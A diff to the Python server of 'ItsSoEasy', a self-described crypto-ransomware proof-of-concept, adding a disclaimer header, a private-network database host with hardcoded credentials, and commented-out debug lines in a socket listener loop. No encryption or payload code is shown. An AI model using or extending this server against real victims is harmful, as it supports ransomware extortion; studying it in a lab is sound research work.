@@ -1,3 +1,21 @@
+"""
+ItsSoEasy -- Crypto-Ransomware Proof-of-Concept
+
+''' server version (Python) '''
+
+What?
+This is a Ransomware Concept written in Python. Yes it is malicious. Yes, if you do that on VMs it is okay. Yes,
+if you misconfigured the architecture or network and encrypt your own files they are gone forever.
+
+Copyright (c) 2021/2022 Bastian Buck
+Contact: https://github.com/bstnbuck
+
+Attention! Use of the code samples and proof-of-concepts shown here is permitted solely at your own risk for academic
+		and non-malicious purposes. It is the end user's responsibility to comply with all applicable local, state,
+		and federal laws. The developer assumes no liability and is not responsible for any misuse or damage caused by this
+		tool and the software in general.
+"""
+
 import logging
 import os
 import socket
@@ -31,7 +49,7 @@ def connectDB():
         conn = mariadb.connect(
             user="itsSoEasy",
             password="toor",
-            host="host-ip",
+            host="192.168.56.105",
             port=3306,
             database="itsSoEasy"
         )
@@ -150,8 +168,14 @@ def runConnection():
                 conn, addr = sock.accept()
                 print("Connected to: " + str(addr))
                 logging.info("Connected to: " + str(addr))
+                # data = conn.recv(1024).decode()
+                # print(data)
                 newClient = threading.Thread(target=handleClient, args=(conn,))
                 newClient.start()
+                # print("after threading")
+                # data = str(data).upper()
+                # conn.send(data.encode())
+                # conn.close()
             except KeyboardInterrupt:
                 exit(0)
             except:
